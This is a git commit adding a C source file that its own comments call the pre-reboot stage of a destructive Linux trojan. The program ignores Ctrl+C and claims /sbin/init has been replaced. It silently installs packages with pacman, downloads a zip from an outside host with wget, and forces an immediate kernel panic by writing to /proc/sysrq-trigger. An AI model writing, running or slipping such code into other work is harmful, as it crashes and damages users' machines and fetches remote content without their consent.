3917a8048bb65aed941a10e2f026240ab03e0057
_Hyperion <145965846+Hyperion0801@users.noreply.github.com>
2026-05-19 16:21:19 +0200

    Restructuring...

---
+++ Code/main.c
@@ -0,0 +1,30 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <signal.h>
+
+// The pre-reboot part of Miku Miku Miku.
+// The system is guaranteed to reboot anyway here, this is just what the user sees before a kernel panic.
+
+int main()
+{
+    signal(SIGINT, SIG_IGN);
+
+    printf("You ran this as Root, eh? If you did, Hatsune Miku turned evil and FUCKED your PC!!!\n/sbin/init has been replaced with a destructive program.\nI have a surprise at the end of the payload however. Stick around to find out what it is!");
+
+    // Downloading some dependencies for the trojan.
+    // The payload doesn't work right without mpv.
+    system("pacman -Sy --noconfirm ffmpeg mpv wget wine > /dev/tty8");
+
+    // This is the assets folder for the trojan.
+    // It houses files that need downloading before the post-reboot payload as networking won't be available during the init step.
+    system("cd / && mkdir miku && cd miku ");
+
+    // This is a lot of shell commands, this trojan depends on wget which is an application, not a header file.
+    system("wget https://aurascope.net/downloads/aurascope-beta-v0.3.2.zip");
+
+    // This is the end of the pre-reboot payload. IT'S KERNEL PANIC TIME!!!!!
+    system("echo c > /proc/sysrq-trigger");
+
+    return 0;
+}
